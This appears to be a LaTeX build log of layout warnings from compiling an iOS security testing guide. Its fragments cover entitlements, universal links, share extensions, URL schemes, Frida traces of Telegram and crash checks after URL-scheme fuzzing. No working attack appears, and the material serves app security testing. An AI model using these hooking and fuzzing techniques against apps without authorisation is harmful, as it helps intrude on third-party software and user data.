\TU/SourceCodePro(6)/m/n/10.95 <appname>.entitlements \TU/SourceSansPro(0)/m/n/
10.95 file as the \TU/SourceCodePro(6)/m/n/10.95 com.apple.developer.default-da
ta-protection
[680]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/cc898defa915d8d7db3adb3f979afac334c445be.
png" >
Underfull \hbox (badness 3000) in paragraph at lines 39487--39494
[]\TU/SourceSansPro(0)/m/n/10.95 If linking on or after iOS 10, developers are 
required to include purpose strings in their app’s

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/eae05828cb9867b6aee454c942147439062e1a64.
png" > [681]
Underfull \hbox (badness 2573) in paragraph at lines 39576--39588
[]\TU/SourceSansPro(0)/m/n/10.95 Apart from simply checking if the permissions 
make sense, further analysis steps might be de-
[682]
Overfull \hbox (30.53203pt too wide) in paragraph at lines 39646--39651
\TU/SourceSansPro(0)/m/it/10.95 bedded provisioning profile \TU/SourceSansPro(0
)/m/n/10.95 that is usually located in the root app bundle folder (\TU/SourceCo
dePro(6)/m/n/10.95 Payload/<appname>.app/\TU/SourceSansPro(0)/m/n/10.95 )
[683]
Overfull \hbox (0.8587pt too wide) in paragraph at lines 39672--39679
\TU/SourceSansPro(0)/m/n/10.95 able to find \TU/SourceCodePro(6)/m/n/10.95 .ent
itlements \TU/SourceSansPro(0)/m/n/10.95 files. This could be also the case for
 the \TU/SourceCodePro(6)/m/n/10.95 embedded.mobileprovision

Overfull \hbox (56.12888pt too wide) in paragraph at lines 39697--39697
[]\TU/SourceCodePro(6)/m/n/10.95 ----------------------------------------------
----------------------------------[] 

Overfull \hbox (145.91937pt too wide) in paragraph at lines 39714--39714
[]\TU/SourceCodePro(6)/m/n/10.95 0x0015d2a4 ascii <?xml version="1.0" encoding=
"UTF-8" standalone="yes"?>\n<!DOCTYPE plist PUBLIC[] 

Overfull \hbox (191.90932pt too wide) in paragraph at lines 39714--39714
[]\TU/SourceCodePro(6)/m/n/10.95 "-//Apple//DTD PLIST 1.0//EN" "http://www.appl
e.com/DTDs/PropertyList-1.0.dtd">\n<plist version="1.0">[] 

Overfull \hbox (42.9894pt too wide) in paragraph at lines 39714--39714
[]\TU/SourceCodePro(6)/m/n/10.95 0x0016427d ascii H<?xml version="1.0" encoding
="UTF-8"?>\n<!DOCTYPE plist PUBLIC[] 

Overfull \hbox (205.04932pt too wide) in paragraph at lines 39714--39714
[]\TU/SourceCodePro(6)/m/n/10.95 "-//Apple//DTD PLIST 1.0//EN" "http://www.appl
e.com/DTDs/PropertyList-1.0.dtd">\n<plist version="1.0">\n[] 
[684]
Overfull \hbox (187.52934pt too wide) in paragraph at lines 39743--39743
[]\TU/SourceCodePro(6)/m/n/10.95 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.
0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">[] 
[685]
Overfull \hbox (0.28447pt too wide) in paragraph at lines 39807--39807
 []        \TU/SourceCodePro(6)/m/n/10.95 // Location services are available, s
o query the user’s location.[] 

Overfull \hbox (150.18265pt too wide) in paragraph at lines 39838--39841
[]\TU/SourceSansPro(0)/m/n/10.95 Consider the list of permissions / capabilitie
s identified in the static analysis (e.g. \TU/SourceCodePro(6)/m/n/10.95 NSLoca
tionWhenInUseUsageDescription\TU/SourceSansPro(0)/m/n/10.95 ). 
[686]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/e23c83cdb5b3794160113d98a0bccc36eb3be1b6.
png" > [687]
Overfull \hbox (130.58942pt too wide) in paragraph at lines 39905--39905
[] \TU/SourceCodePro(6)/m/n/10.95 11186 ms     |    | +[CLLocationManager _auth
orizationStatusForBundleIdentifier:0x0 bundle:0x0][] 

Overfull \hbox (64.88943pt too wide) in paragraph at lines 39940--39940
[]  \TU/SourceCodePro(6)/m/n/10.95 3630 ms     | -[CLLocationManager initWithEf
fectiveBundleIdentifier:0x0 bundle:0x0][] 

Overfull \hbox (183.14935pt too wide) in paragraph at lines 39940--39940
[]\TU/SourceCodePro(6)/m/n/10.95 0x1031aa158 TelegramUI!+[TGLocationUtils reque
stWhenInUserLocationAuthorizationWithLocationManager:][] 

Overfull \hbox (42.98938pt too wide) in paragraph at lines 39940--39940
[]    \TU/SourceCodePro(6)/m/n/10.95 0x10337e2c0 TelegramUI!-[TGLocationPickerC
ontroller initWithContext:intent:][] 

Overfull \hbox (252.63443pt too wide) in paragraph at lines 39942--39950
\TU/SourceSansPro(0)/m/n/10.95 Status.authorizedWhenInUse[][]) and was called b
y \TU/SourceCodePro(6)/m/n/10.95 +[TGLocationUtils requestWhenInUserLocationAut
horizationWithLocationManager:]\TU/SourceSansPro(0)/m/n/10.95 .
[688]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/0b7f0c46917539212ca389968c59a617a2f79b41.
png" > [689] [690]
Overfull \hbox (198.84799pt too wide) in paragraph at lines 40126--40132
\TU/SourceCodePro(6)/m/n/10.95 https://<domain>/apple-app-site-association \TU/
SourceSansPro(0)/m/n/10.95 or \TU/SourceCodePro(6)/m/n/10.95 https://<domain>/.
well-known/apple-app-site-association\TU/SourceSansPro(0)/m/n/10.95 . 
[691]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/d8998c087e399a85eecdd91878167c02546f33d5.
png" > [692]
Underfull \hbox (badness 4531) in paragraph at lines 40213--40217
[]\TU/SourceSansPro(0)/m/n/10.95 In order to receive links and handle them appr
opriately, the app delegate has to implement

Underfull \hbox (badness 1377) in paragraph at lines 40213--40217
[][]\TU/SourceCodePro(6)/m/n/10.95 application:continueUserActivity:restoration
Handler:[][]\TU/SourceSansPro(0)/m/n/10.95 . If you have the original

Overfull \hbox (20.3754pt too wide) in paragraph at lines 40225--40234
\TU/SourceCodePro(6)/m/n/10.95 NSUserActivity \TU/SourceSansPro(0)/m/n/10.95 ob
ject with an \TU/SourceCodePro(6)/m/n/10.95 activityType \TU/SourceSansPro(0)/m
/n/10.95 value of \TU/SourceCodePro(6)/m/n/10.95 NSUserActivityTypeBrowsingWeb\
TU/SourceSansPro(0)/m/n/10.95 .
[693]
Underfull \hbox (badness 1097) in paragraph at lines 40278--40287
[]\TU/SourceSansPro(0)/m/n/10.95 As stated in the [][]Apple Developer Documenta
tion[][], when iOS opens an app as the result of a uni-

Underfull \hbox (badness 5217) in paragraph at lines 40278--40287
\TU/SourceSansPro(0)/m/n/10.95 versal link, the app receives an \TU/SourceCodeP
ro(6)/m/n/10.95 NSUserActivity \TU/SourceSansPro(0)/m/n/10.95 object with an \T
U/SourceCodePro(6)/m/n/10.95 activityType \TU/SourceSansPro(0)/m/n/10.95 value 
of

Underfull \hbox (badness 4739) in paragraph at lines 40278--40287
\TU/SourceCodePro(6)/m/n/10.95 NSUserActivityTypeBrowsingWeb\TU/SourceSansPro(0
)/m/n/10.95 . The activity object’s \TU/SourceCodePro(6)/m/n/10.95 webpageURL \
TU/SourceSansPro(0)/m/n/10.95 property contains

Overfull \hbox (75.83939pt too wide) in paragraph at lines 40298--40298
[]\TU/SourceCodePro(6)/m/n/10.95 func application(_ application: UIApplication,
 continue userActivity: NSUserActivity,[] 

Overfull \hbox (95.54948pt too wide) in paragraph at lines 40298--40298
[]                 \TU/SourceCodePro(6)/m/n/10.95 restorationHandler: @escaping
 ([UIUserActivityRestoring]?) -> Void) -> Bool {[] 

Overfull \hbox (174.38939pt too wide) in paragraph at lines 40298--40298
[]    \TU/SourceCodePro(6)/m/n/10.95 if userActivity.activityType == NSUserActi
vityTypeBrowsingWeb, let url = userActivity.webpageURL {[] 
[694]
Overfull \hbox (91.1694pt too wide) in paragraph at lines 40338--40338
[]        \TU/SourceCodePro(6)/m/n/10.95 let components = NSURLComponents(url: 
incomingURL, resolvingAgainstBaseURL: true),[] 

Overfull \hbox (14.51945pt too wide) in paragraph at lines 40338--40338
[]    \TU/SourceCodePro(6)/m/n/10.95 if let albumName = params.first(where: { $
0.name == "albumname" })?.value,[] 
[695]
Overfull \hbox (21.06395pt too wide) in paragraph at lines 40350--40353
[]\TU/SourceSansPro(0)/m/n/10.95 If you have the original source code, you can 
search it for the \TU/SourceCodePro(6)/m/n/10.95 openURL:options:completionHand
ler:

Overfull \hbox (113.06952pt too wide) in paragraph at lines 40376--40376
[]                        \TU/SourceCodePro(6)/m/n/10.95 options: [UIApplicatio
nOpenURLOptionUniversalLinksOnly: true as NSNumber],[] 

Overfull \hbox (14.51956pt too wide) in paragraph at lines 40376--40376
[]                        \TU/SourceCodePro(6)/m/n/10.95 completionHandler: { v
alue in completion.completion(value)}[] 

Underfull \hbox (badness 1565) in paragraph at lines 40378--40384
[]\TU/SourceSansPro(0)/m/n/10.95 Note how the app adapts the \TU/SourceCodePro(
6)/m/n/10.95 scheme \TU/SourceSansPro(0)/m/n/10.95 to “https” before opening it
 and how it uses the option
[696] [697]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/e630660530187b6fd1e8abc487b7f7ea1ac607f9.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/78ccba3d3728d1b436149123dac95a31099b24de.
png" > [698]
Overfull \hbox (74.40862pt too wide) in paragraph at lines 40518--40522
[]\TU/SourceSansPro(0)/m/n/10.95 If we repeat the process and hook or trace the
 \TU/SourceCodePro(6)/m/n/10.95 application:continueUserActivity:restorationHan
dler:

Overfull \hbox (1.6642pt too wide) in paragraph at lines 40531--40535
\TU/SourceSansPro(0)/m/n/10.95 this example, we will use Telegram, as there are
 no restrictions in its \TU/SourceCodePro(6)/m/n/10.95 apple-app-site-associati
on
[699]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/c541fc7b7d3f4dd9ff4b816d9bc3e5ce0484f553.
png" > [700]
Overfull \hbox (51.74939pt too wide) in paragraph at lines 40597--40597
[]\TU/SourceCodePro(6)/m/n/10.95 298382 ms  -[AppDelegate application:0x10556b3
c0 continueUserActivity:0x1c4237780[] 
[701]
Overfull \hbox (51.74939pt too wide) in paragraph at lines 40632--40632
[]\TU/SourceCodePro(6)/m/n/10.95 298382 ms  -[AppDelegate application:0x10556b3
c0 continueUserActivity:0x1c4237780[] 
[702]
Overfull \hbox (102.1193pt too wide) in paragraph at lines 40672--40672
[]\TU/SourceCodePro(6)/m/n/10.95 $S10TelegramUI0A19ApplicationBindingsC16openUn
iversalUrlyySS_AA0ac4OpenG10Completion...[] 

Overfull \hbox (148.10934pt too wide) in paragraph at lines 40672--40672
[]\TU/SourceCodePro(6)/m/n/10.95 $S10TelegramUI15openExternalUrl7account7contex
t3url05forceD016presentationData18application...[] 

Overfull \hbox (180.95932pt too wide) in paragraph at lines 40672--40672
[]\TU/SourceCodePro(6)/m/n/10.95 $S10TelegramUI31AuthorizationSequenceControlle
rC7account7strings7openUrl5apiId0J4HashAC0A4Core19...[] 

Overfull \hbox (51.74939pt too wide) in paragraph at lines 40686--40686
[]\TU/SourceCodePro(6)/m/n/10.95 298382 ms  -[AppDelegate application:0x10556b3
c0 continueUserActivity:0x1c4237780[] 

Overfull \hbox (132.77936pt too wide) in paragraph at lines 40686--40686
[]\TU/SourceCodePro(6)/m/n/10.95 298619 ms     | $S10TelegramUI15openExternalUr
l7account7context3url05forceD016presentationData[] 

Overfull \hbox (99.92947pt too wide) in paragraph at lines 40686--40686
[]                \TU/SourceCodePro(6)/m/n/10.95 18applicationContext20navigati
onController12dismissInputy0A4Core7AccountC_AA[] 

Overfull \hbox (60.50946pt too wide) in paragraph at lines 40686--40686
[]                \TU/SourceCodePro(6)/m/n/10.95 14OpenURLContextOSSSbAA012Pres
entationK0CAA0a11ApplicationM0C7Display0[] 

Overfull \hbox (180.95932pt too wide) in paragraph at lines 40705--40705
[]\TU/SourceCodePro(6)/m/n/10.95 $ xcrun swift-demangle S10TelegramUI15openExte
rnalUrl7account7context3url05forceD016presentationData[] 

Overfull \hbox (187.52933pt too wide) in paragraph at lines 40705--40705
[]\TU/SourceCodePro(6)/m/n/10.95 18applicationContext20navigationController12di
smissInputy0A4Core7AccountC_AA14OpenURLContextOSSSbAA0[] 

Overfull \hbox (95.5494pt too wide) in paragraph at lines 40715--40715
[]    \TU/SourceCodePro(6)/m/n/10.95 account: TelegramCore.Account, context: Te
legramUI.OpenURLContext, url: Swift.String,[] 

Overfull \hbox (21.08942pt too wide) in paragraph at lines 40715--40715
[]    \TU/SourceCodePro(6)/m/n/10.95 forceExternal: Swift.Bool, presentationDat
a: TelegramUI.PresentationData,[] 

Overfull \hbox (71.45941pt too wide) in paragraph at lines 40715--40715
[]    \TU/SourceCodePro(6)/m/n/10.95 navigationController: Display.NavigationCo
ntroller?, dismissInput: () -> ()) -> ()[] 
[703]
Overfull \hbox (51.74939pt too wide) in paragraph at lines 40769--40769
[]\TU/SourceCodePro(6)/m/n/10.95 298382 ms  -[AppDelegate application:0x10556b3
c0 continueUserActivity:0x1c4237780[] 

Overfull \hbox (51.74939pt too wide) in paragraph at lines 40769--40769
[]\TU/SourceCodePro(6)/m/n/10.95 context: TelegramUI.OpenURLContext, url: Swift
.String, forceExternal: Swift.Bool,[] 

Overfull \hbox (124.01936pt too wide) in paragraph at lines 40769--40769
[]\TU/SourceCodePro(6)/m/n/10.95 TelegramUI.TelegramApplicationContext, navigat
ionController: Display.NavigationController?,[] 
[704]
Overfull \hbox (101.7325pt too wide) in paragraph at lines 40795--40802
\TU/SourceSansPro(0)/m/n/10.95 hook (e.g. by adding a line like this \TU/Source
CodePro(6)/m/n/10.95 log("userInfo:" + ObjC.Object(args[3]).userInfo().toString
());\TU/SourceSansPro(0)/m/n/10.95 ). 

Overfull \hbox (133.71016pt too wide) in paragraph at lines 40812--40815
[]\TU/SourceSansPro(0)/m/n/10.95 Both rely on the same method when receiving da
ta (\TU/SourceCodePro(6)/m/n/10.95 application:continueUserActivity:restoration
Handler:\TU/SourceSansPro(0)/m/n/10.95 ). 

Overfull \hbox (161.5597pt too wide) in paragraph at lines 40815--40821
[]\TU/SourceSansPro(0)/m/n/10.95 Like universal links, the Handoff’s Activity C
ontinuation must be declared in the \TU/SourceCodePro(6)/m/n/10.95 com.apple.de
veloper.associated-domains
[705]
Overfull \hbox (51.74939pt too wide) in paragraph at lines 40852--40852
[]\TU/SourceCodePro(6)/m/n/10.95 298382 ms  -[AppDelegate application:0x10556b3
c0 continueUserActivity:0x1c4237780[] 

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/8f48bb85a349f9e3264a10f6d5ab82d6404eb8b7.
png" > [706] [707]
Overfull \hbox (106.17824pt too wide) in paragraph at lines 40979--40985
[]\TU/SourceSansPro(0)/m/n/10.95 if the app properly \TU/SourceSansPro(0)/m/it/
10.95 verifies the received data \TU/SourceSansPro(0)/m/n/10.95 by looking into
 the implementation of [][]\TU/SourceCodePro(6)/m/n/10.95 application:openURL:o
ptions:[][]
[708]
Overfull \hbox (4.9054pt too wide) in paragraph at lines 41055--41057
[]\TU/SourceSansPro(0)/m/n/10.95 The app also declares the document types it op
ens as we can find the key \TU/SourceCodePro(6)/m/n/10.95 CFBundleDocumentTypes
\TU/SourceSansPro(0)/m/n/10.95 : 
[709]
Overfull \hbox (221.32112pt too wide) in paragraph at lines 41078--41085
\TU/SourceCodePro(6)/m/n/10.95 LSItemContentTypes \TU/SourceSansPro(0)/m/n/10.9
5 and it’s ready to open files with the extensions listed in \TU/SourceCodePro(
6)/m/n/10.95 UTTypeTagSpecification/"public.filename-extension"\TU/SourceSansPr
o(0)/m/n/10.95 .

Underfull \hbox (badness 3229) in paragraph at lines 41104--41106
[]\TU/SourceSansPro(0)/m/n/10.95 The \TU/SourceCodePro(6)/m/n/10.95 excludedAct
ivityTypes\TU/SourceSansPro(0)/m/n/10.95 : an array of the Activity Types that 
are not supported,

Overfull \hbox (71.8354pt too wide) in paragraph at lines 41113--41117
[]\TU/SourceSansPro(0)/m/n/10.95 Hook the method we have seen in the static ana
lysis ([][]\TU/SourceCodePro(6)/m/n/10.95 init(activityItems:applicationActivit
ies:)[][]\TU/SourceSansPro(0)/m/n/10.95 )
[710] [711] [712] [713]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/bd8dc141de1388af244f55cf297a00d01629c14f.
png" >
Overfull \hbox (65.98448pt too wide) in paragraph at lines 41334--41334
 []                    \TU/SourceCodePro(6)/m/n/10.95 /Containers/com.some.file
manager/Documents/Inbox/OWASP_MASVS.pdf[] 

Overfull \hbox (37.5144pt too wide) in paragraph at lines 41334--41334
 []    \TU/SourceCodePro(6)/m/n/10.95 UIApplicationOpenURLOptionsSourceApplicat
ionKey = "com.apple.sharingd";[] 

Overfull \hbox (140.44437pt too wide) in paragraph at lines 41334--41334
 []    \TU/SourceCodePro(6)/m/n/10.95 "_UIApplicationOpenURLOptionsSourceProces
sHandleKey" = "<FBSProcessHandle: 0x1c3a63140;[] 

Overfull \hbox (11.23476pt too wide) in paragraph at lines 41334--41334
 []                                                                \TU/SourceCo
dePro(6)/m/n/10.95 sharingd:605; valid: YES>";[] 

Overfull \hbox (164.53435pt too wide) in paragraph at lines 41334--41334
 []\TU/SourceCodePro(6)/m/n/10.95 0x18c7930d8 UIKit!__58-[UIApplication _applic
ationOpenURLAction:payload:origin:]_block_invoke[] 
[714]
Overfull \hbox (65.98438pt too wide) in paragraph at lines 41334--41334
 []\TU/SourceCodePro(6)/m/n/10.95 0x1857cdc34 FrontBoardServices!-[FBSSerialQue
ue _performNextFromRunLoopSource][] 

Overfull \hbox (1.37955pt too wide) in paragraph at lines 41357--41357
[]                            \TU/SourceCodePro(6)/m/n/10.95 /com.some.filemana
ger/Documents/Inbox/OWASP_MASVS.pdf[] 

Overfull \hbox (137.15936pt too wide) in paragraph at lines 41357--41357
[]\TU/SourceCodePro(6)/m/n/10.95 0x18c7930d8 UIKit!__58-[UIApplication _applica
tionOpenURLAction:payload:origin:]_block_invoke[] 

Overfull \hbox (21.08937pt too wide) in paragraph at lines 41357--41357
[]\TU/SourceCodePro(6)/m/n/10.95 0x1857cd9f4 FrontBoardServices!__FBSSERIALQUEU
E_IS_CALLING_OUT_TO_A_BLOCK__[] 

Underfull \hbox (badness 3128) in paragraph at lines 41359--41370
[]\TU/SourceSansPro(0)/m/n/10.95 If you look at the stack trace, you can see ho
w \TU/SourceCodePro(6)/m/n/10.95 application:openURL:options: \TU/SourceSansPro
(0)/m/n/10.95 called
[715]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/5473929e7bf77cdcc33fa8e73d8852d5453b9fa9.
png" > [716]
Overfull \hbox (21.48004pt too wide) in paragraph at lines 41503--41506
[]\TU/SourceSansPro(0)/m/n/10.95 If you have the original source code you can s
earch for all occurrences of \TU/SourceCodePro(6)/m/n/10.95 NSExtensionPointIde
ntifier

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/557a97dedf920b66a40f2e92cd9f0010948caa4d.
png" > [717]
Overfull \hbox (21.0894pt too wide) in paragraph at lines 41548--41548
[]    \TU/SourceCodePro(6)/m/n/10.95 /var/containers/Bundle/Application/15E6A58
F-1CA7-44A4-A9E0-6CA85B65FA35/[] 

Overfull \hbox (71.45897pt too wide) in paragraph at lines 41548--41548
[]\TU/SourceCodePro(6)/m/n/10.95 ------------  -------  ------------------  ---
---  -------   -------------------------[] 

Overfull \hbox (16.70961pt too wide) in paragraph at lines 41548--41548
[]\TU/SourceCodePro(6)/m/n/10.95 Directory         493  None                Tru
e    False     NotificationContent.appex[] 
[718]
Underfull \hbox (badness 4995) in paragraph at lines 41593--41602
[]\TU/SourceSansPro(0)/m/n/10.95 Remember that app extensions and their contain
ing apps do not have direct access to each

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/58e3d56af1f679e03a8f5cb31471a7c09d6e23c2.
png" >
Overfull \hbox (174.45512pt too wide) in paragraph at lines 41616--41622
[]\TU/SourceSansPro(0)/m/n/10.95 It is possible to reject a specific type of ap
p extension by using the method [][]\TU/SourceCodePro(6)/m/n/10.95 application:
shouldAllowExtensionPointIdentifier:[][]\TU/SourceSansPro(0)/m/n/10.95 .
[719]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/73067a4b013a3b6059ad9d5d1dcc72d0079ba9b8.
png" > [720]
Overfull \hbox (45.17938pt too wide) in paragraph at lines 41672--41672
[]\TU/SourceCodePro(6)/m/n/10.95 0x18284355c Foundation!-[NSExtension _itemProv
iderForPayload:extensionContext:][] 

Overfull \hbox (143.72934pt too wide) in paragraph at lines 41672--41672
[]\TU/SourceCodePro(6)/m/n/10.95 0x1828447a4 Foundation!-[NSExtension _loadItem
ForPayload:contextIdentifier:completionHandler:][] 

Overfull \hbox (47.36937pt too wide) in paragraph at lines 41672--41672
[]\TU/SourceCodePro(6)/m/n/10.95 0x182973224 Foundation!__NSXPCCONNECTION_IS_CA
LLING_OUT_TO_EXPORTED_OBJECT_S3__[] 

Overfull \hbox (58.31937pt too wide) in paragraph at lines 41672--41672
[]\TU/SourceCodePro(6)/m/n/10.95 0x182971968 Foundation!-[NSXPCConnection _deco
deAndInvokeMessageWithEvent:flags:][] 

Overfull \hbox (145.91937pt too wide) in paragraph at lines 41672--41672
[]    \TU/SourceCodePro(6)/m/n/10.95 "<NSItemProvider: 0x1c46b30e0> {types = (\
n \"public.plain-text\",\n \"public.file-url\"\n)}"[] 

Overfull \hbox (8.29985pt too wide) in paragraph at lines 41683--41688
[]\TU/SourceSansPro(0)/m/n/10.95 The UTIs included in the \TU/SourceCodePro(6)/
m/n/10.95 NSItemProvider \TU/SourceSansPro(0)/m/n/10.95 are \TU/SourceCodePro(6
)/m/n/10.95 public.plain-text \TU/SourceSansPro(0)/m/n/10.95 and \TU/SourceCode
Pro(6)/m/n/10.95 public.file-url\TU/SourceSansPro(0)/m/n/10.95 ,

Overfull \hbox (152.48935pt too wide) in paragraph at lines 41707--41707
[]\TU/SourceCodePro(6)/m/n/10.95 RET: <PKPlugin: 0x1163637f0 ph.telegra.Telegra
ph.Share(5.3) 5B6DE177-F09B-47DA-90CD-34D73121C785[] 

Overfull \hbox (80.21938pt too wide) in paragraph at lines 41707--41707
[]\TU/SourceCodePro(6)/m/n/10.95 1(2) /private/var/containers/Bundle/Applicatio
n/15E6A58F-1CA7-44A4-A9E0-6CA85B65FA35[] 

Overfull \hbox (165.62935pt too wide) in paragraph at lines 41707--41707
[]\TU/SourceCodePro(6)/m/n/10.95 RET: <PKPlugin: 0x10bff7910 com.apple.mobileno
tes.SharingExtension(1.5) 73E4F137-5184-4459-A70A-83[] 

Overfull \hbox (150.29936pt too wide) in paragraph at lines 41707--41707
[]\TU/SourceCodePro(6)/m/n/10.95 F90A1414DC 1(2) /private/var/containers/Bundle
/Application/5E267B56-F104-41D0-835B-F1DAB9AE076D[] 
[721]
Underfull \hbox (badness 10000) in paragraph at lines 41717--41719
[]\TU/SourceCodePro(6)/m/n/10.95 com.apple.mobilenotes.SharingExtension.appex \
TU/SourceSansPro(0)/m/n/10.95 which is receiving and will
[722]
Overfull \hbox (61.00945pt too wide) in paragraph at lines 41788--41794
[]\TU/SourceSansPro(0)/bx/n/10.95 Custom pasteboards \TU/SourceSansPro(0)/m/n/1
0.95 can be created with [][]\TU/SourceCodePro(6)/m/n/10.95 pasteboardWithName:
create:[][] \TU/SourceSansPro(0)/m/n/10.95 or [][]\TU/SourceCodePro(6)/m/n/10.9
5 pasteboardWithUniqueName[][]\TU/SourceSansPro(0)/m/n/10.95 .
[723] [724] [725] [726]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/95cff8add424bdeb2b14d8bcd415271271611314.
png" > [727]
Overfull \hbox (104.919pt too wide) in paragraph at lines 42137--42142
\TU/SourceSansPro(0)/m/n/10.95 rameters by creating appropriately formatted URL
s and opening them with the [][]\TU/SourceCodePro(6)/m/n/10.95 openURL:options:
completionHandler:[][]

Overfull \hbox (7.82901pt too wide) in paragraph at lines 42160--42169
[]\TU/SourceSansPro(0)/m/n/10.95 Before calling the \TU/SourceCodePro(6)/m/n/10
.95 openURL:options:completionHandler: \TU/SourceSansPro(0)/m/n/10.95 method, a
pps can call [][]\TU/SourceCodePro(6)/m/n/10.95 canOpenURL:[][]
[728]
Overfull \hbox (55.19263pt too wide) in paragraph at lines 42180--42187
\TU/SourceSansPro(0)/m/n/10.95 stalled. However, this restriction only applies 
to \TU/SourceCodePro(6)/m/n/10.95 canOpenURL\TU/SourceSansPro(0)/m/n/10.95 , \T
U/SourceSansPro(0)/bx/n/10.95 the \TU/SourceCodePro(6)/bx/n/10.95 openURL:optio
ns:completionHandler:

Overfull \hbox (175.60478pt too wide) in paragraph at lines 42221--42225
[]\TU/SourceCodePro(6)/m/n/10.95 application:didFinishLaunchingWithOptions: \TU
/SourceSansPro(0)/m/n/10.95 method or \TU/SourceCodePro(6)/m/n/10.95 applicatio
n:will-FinishLaunchingWithOptions:\TU/SourceSansPro(0)/m/n/10.95 :

Overfull \hbox (156.8694pt too wide) in paragraph at lines 42261--42261
[]\TU/SourceCodePro(6)/m/n/10.95 func application(_ application: UIApplication,
 open url: URL, sourceApplication: String?) -> Bool {[] 
[729]
Overfull \hbox (97.73941pt too wide) in paragraph at lines 42261--42261
[]\TU/SourceCodePro(6)/m/n/10.95 func application(_ application: UIApplication,
 open url: URL, sourceApplication: String?,[] 

Overfull \hbox (16.70943pt too wide) in paragraph at lines 42261--42261
[]\TU/SourceCodePro(6)/m/n/10.95 func application(_ application: UIApplication,
 handleOpen url: URL) -> Bool {[] 
[730]
Overfull \hbox (25.46942pt too wide) in paragraph at lines 42326--42326
[]    \TU/SourceCodePro(6)/m/n/10.95 options: [UIApplicationOpenURLOptionUniver
salLinksOnly: true as NSNumber],[] 

Overfull \hbox (25.46942pt too wide) in paragraph at lines 42326--42326
[]    \TU/SourceCodePro(6)/m/n/10.95 options: [UIApplicationOpenURLOptionUniver
salLinksOnly: true as NSNumber],[] 

Overfull \hbox (84.59961pt too wide) in paragraph at lines 42343--42343
[]                                        \TU/SourceCodePro(6)/m/n/10.95 string
: "https://telegram.org/deactivate?phone=\(phone)")![] 

Overfull \hbox (40.79941pt too wide) in paragraph at lines 42360--42360
[]\TU/SourceCodePro(6)/m/n/10.95 if documentUri.hasPrefix("file://"), let path 
= URL(string: documentUri)?.path {[] 
[731]
Overfull \hbox (170.00934pt too wide) in paragraph at lines 42360--42360
[]\TU/SourceCodePro(6)/m/n/10.95 guard let dict = TGStringUtils.argumentDiction
ary(inUrlString: String(url[url.index(url.startIndex,[] 

Overfull \hbox (29.84938pt too wide) in paragraph at lines 42360--42360
[]\TU/SourceCodePro(6)/m/n/10.95 if let url = URL(string: "itms-apps://itunes.a
pple.com/app/id\(appStoreId)") {[] 

Overfull \hbox (16.7094pt too wide) in paragraph at lines 42360--42360
[]\TU/SourceCodePro(6)/m/n/10.95 [[WKExtension sharedExtension] openSystemURL:[
NSURL URLWithString:[NSString[] 
[732] [733]
Overfull \hbox (3.5245pt too wide) in paragraph at lines 42501--42501
[]\TU/SourceCodePro(6)/m/n/10 ObjC[].[]classes[].[]UIApplication[].[]sharedAppl
ication[]()[];[]|  

Overfull \hbox (249.8999pt too wide) in paragraph at lines 42510--42515
[]\TU/SourceSansPro(0)/m/n/10.95 Or as in this example from [][]Frida CodeShare
[][] where the author uses the non-public API \TU/SourceCodePro(6)/m/n/10.95 LS
ApplicationWorkspace.openSensitiveURL:withOptions:
[734]
Overfull \hbox (62.69954pt too wide) in paragraph at lines 42570--42570
[]  \TU/SourceCodePro(6)/m/n/10.95 URI                  yes       URI to launch
, eg tel://123456789 or http://www.google.com/[] 
[735] [736]
Overfull \hbox (208.13008pt too wide) in paragraph at lines 42668--42671
[]\TU/SourceSansPro(0)/m/n/10.95 We can also know from where it was called, as 
expected from \TU/SourceCodePro(6)/m/n/10.95 -[UIApplication _applicationOpenUR
LAction:payload:origin:]\TU/SourceSansPro(0)/m/n/10.95 . 

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/c441621c9bee29c2fbc9a04d05bc8426d67bfff9.
jpg" > [737]
Overfull \hbox (3.5245pt too wide) in paragraph at lines 42699--42699
[]\TU/SourceCodePro(6)/m/n/10 ObjC[].[]classes[].[]UIApplication[].[]sharedAppl
ication[]()[];[]|  
[738]
Overfull \hbox (141.464pt too wide) in paragraph at lines 42739--42746
[]\TU/SourceSansPro(0)/m/n/10.95 The output is truncated for better readability
. This time you see that \TU/SourceCodePro(6)/m/n/10.95 UIApplicationOpenURLOpt
ionsSourceApplicationKey
[739]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/a9306a55201426996cd4188ec50973be63efb594.
png" >
Overfull \hbox (21.5245pt too wide) in paragraph at lines 42770--42770
[]\TU/SourceCodePro(6)/m/n/10 $S10TelegramUI15openExternalUrl7account7context3u
rl05forceD016presentationData[]|  

Overfull \hbox (21.5245pt too wide) in paragraph at lines 42771--42771
\TU/SourceCodePro(6)/m/n/10 text20navigationController12dismissInputy0A4Core7Ac
countC_AA14Open|  

Overfull \hbox (69.5245pt too wide) in paragraph at lines 42772--42772
\TU/SourceCodePro(6)/m/n/10 bAA012PresentationK0CAA0a11ApplicationM0C7Display01
0NavigationO0CSgyyctF()[]|  
[740] [741]
Underfull \hbox (badness 7796) in paragraph at lines 42852--42855
[]\TU/SourceCodePro(6)/m/n/10.95 application:openURL:options: \TU/SourceSansPro
(0)/m/n/10.95 handles the URL but does not open it, it calls

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/eecc821a0dd66cce69d08c4b2975ef636b355063.
png" > [742] [743] [744]
Overfull \hbox (87.28583pt too wide) in paragraph at lines 42989--42991
[]\TU/SourceSansPro(0)/m/n/10.95 Check if the app generates a crash report (\TU
/SourceCodePro(6)/m/n/10.95 .ips\TU/SourceSansPro(0)/m/n/10.95 ) in \TU/SourceC
